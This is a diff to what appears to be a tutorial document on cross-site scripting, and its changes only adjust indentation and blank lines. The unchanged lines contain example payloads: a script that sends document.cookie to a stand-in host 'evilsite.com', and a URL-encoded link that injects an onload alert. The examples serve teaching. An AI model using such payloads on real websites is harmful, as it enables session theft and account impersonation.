@@ -160,8 +160,7 @@ Example of Cross-Site Scripting:
 	  the hacker to impersonate the user who looked at the website. [xss-attacks]_ 
 	 
 	* Attack: 
-	
-	  ``<script>``
+		``<script>``
 			``window.open("http://evilsite.com/cookie_stealer.php?cookie=" + document.cookie, "_blank");``
 		``</script>``
 
@@ -176,7 +175,9 @@ Example of Cross-Site Scripting:
 	  shown below, and an alert saying "XSS"(code) will pop up. 
 	
 	* Attack:
+	
 	  Link: ``/form.php?%22%20onload%3D%22alert(%27XSS%27)%3B``
+	  
 	  Code: ``<form action="/form.php?" onload="alert('XSS');" method="post">`` 
 
 
